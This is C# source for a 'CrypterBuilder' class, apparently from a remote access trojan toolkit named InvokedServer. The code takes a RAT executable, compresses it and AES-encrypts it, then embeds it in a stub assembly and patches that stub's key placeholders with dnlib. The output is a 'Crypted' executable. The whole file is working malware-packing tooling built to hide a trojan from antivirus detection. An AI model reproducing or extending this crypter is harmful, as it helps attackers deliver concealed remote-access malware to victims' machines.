

using dnlib.DotNet;
using dnlib.DotNet.Emit;
using InvokedServer.Properties;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;


namespace InvokedServer.Build
{
	internal class CrypterBuilder
	{
		public static string SetInputFile()
		{
			SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.OverwritePrompt = false;
			saveFileDialog.FileName = "";
			saveFileDialog.Filter = "Executable files (*.exe)|*.exe";
			saveFileDialog.Title = "Choose File";
			saveFileDialog.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
			return saveFileDialog.ShowDialog() != DialogResult.OK ? null : saveFileDialog.FileName;
		}

		public static string SetOutputFile()
		{
			SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.OverwritePrompt = false;
			saveFileDialog.FileName = "Crypted";
			saveFileDialog.Filter = "Executable files (*.exe)|*.exe";
			saveFileDialog.Title = "Save File";
			saveFileDialog.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
			return saveFileDialog.ShowDialog() != DialogResult.OK ? null : saveFileDialog.FileName;
		}

		public static void Build(byte[] InputRat, string outputpath, string enckey, bool compress)
		{
			if (InputRat != null)
			{
				if (outputpath != null)
				{
					try
					{
						ModuleDefMD moduleDefMd = ModuleDefMD.Load(Resources.Stub);
						byte[] data1 = InputRat;
						if (compress)
							data1 = CrypterEncryption.Compress(data1);
						byte[] data2 = CrypterEncryption.AESEnc(data1, enckey);
						moduleDefMd.Resources.Add((Resource)new EmbeddedResource((UTF8String)"a", data2));
						foreach (TypeDef type in (IEnumerable<TypeDef>)moduleDefMd.Types)
						{
							if (type.Name == "Program")
							{
								foreach (MethodDef method in (IEnumerable<MethodDef>)type.Methods)
								{
									if (method.Body != null)
									{
										for (int index = 0; index < method.Body.Instructions.Count<Instruction>(); ++index)
										{
											if (method.Body.Instructions[index].OpCode == OpCodes.Ldstr)
											{
												if (method.Body.Instructions[index].Operand.ToString() == "%EncKey%")
													method.Body.Instructions[index].Operand = (object)enckey;
												if (method.Body.Instructions[index].Operand.ToString() == "%CompressFlag%")
													method.Body.Instructions[index].Operand = !compress ? (object)"No" : (object)"Yes";
											}
										}
									}
								}
							}
						}
						moduleDefMd.Write(outputpath);
						moduleDefMd.Dispose();
						return;
					}
					catch (Exception ex)
					{
						int num = (int)MessageBox.Show("An error has occurred: " + ex.Message);
						return;
					}
				}
			}
			int num1 = (int)MessageBox.Show("Choose input/output files first");
		}
	}
}